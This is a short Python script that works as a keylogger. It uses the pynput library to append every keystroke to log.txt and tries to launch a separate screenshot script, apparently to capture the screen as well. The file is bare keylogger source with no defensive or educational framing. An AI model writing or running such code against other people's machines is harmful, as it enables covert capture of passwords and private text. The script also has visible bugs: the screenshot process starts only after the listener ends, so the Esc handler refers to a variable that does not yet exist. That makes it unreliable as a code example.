import subprocess

from pynput.keyboard import Key, Listener


def on_press(key):
    print("{0} pressed".format(key))
    write_key_to_file(key)


def write_key_to_file(key):
    with open("log.txt", "a") as f:
        k = str(key).replace("'", "")
        if k == "Key.space":
            f.write(" ")
        elif k.find(".") > 0:
            f.write("")
        else:
            f.write(k)


def on_release(key):
    if key == Key.esc:
        global ss_procces
        ss_procces.kill()
        return False


with Listener(on_press=on_press, on_release=on_release, ) as listener:
    listener.join()

ss_procces=subprocess.Popen("screenshoots.py")
